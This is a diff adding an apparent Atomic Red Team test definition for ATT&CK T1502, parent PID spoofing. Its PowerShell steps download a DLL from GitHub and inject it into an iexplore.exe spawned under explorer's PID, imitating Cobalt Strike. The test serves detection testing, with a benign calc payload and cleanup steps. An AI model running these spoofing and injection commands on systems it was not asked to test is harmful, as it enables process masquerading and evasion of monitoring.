@@ -1,0 +1,57 @@
+---
+attack_technique: T1502
+display_name: Parent PID Spoofing
+
+atomic_tests:
+- name: Parent PID Spoofing using PowerShell
+  description: |
+    This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.
+    Upon execution, "Process C:\Program Files\Internet Explorer\iexplore.exe is spawned with pid ####" will be displayed and
+    calc.exe will be launched.
+
+    Credit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    parent_process_name:
+      description: Name of the parent process
+      type: string
+      default: "explorer"
+    dll_path:
+      description: Path of the dll to inject
+      type: path 
+      default: PathToAtomicsFolder\T1502\bin\calc.dll
+    dll_process_name:
+      description:  Name of the created process from the injected dll
+      type: string
+      default: "calculator"
+    spawnto_process_path:
+      description: Path of the process to spawn
+      type: path 
+      default: C:\Program Files\Internet Explorer\iexplore.exe
+    spawnto_process_name:
+      description: Name of the process to spawn
+      type: string
+      default: "iexplore"
+
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        DLL to inject must exist on disk at specified location (#{dll_path})
+      prereq_command: |
+        if (Test-Path #{dll_path}) {exit 0} else {exit 1}
+      get_prereq_command: |
+        New-Item -Type Directory (split-path #{dll_path}) -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1502/bin/calc.dll" -OutFile "#{dll_path}"
+
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      . $PathToAtomicsFolder\T1502\src\PPID-Spoof.ps1
+      $ppid=Get-Process #{parent_process_name} | select -expand id
+      PPID-Spoof -ppid $ppid -spawnto "#{spawnto_process_path}" -dllpath "#{dll_path}"
+    cleanup_command: |
+      Stop-Process -Name "#{dll_process_name}" -ErrorAction Ignore
+      Stop-Process -Name "#{spawnto_process_name}" -ErrorAction Ignore
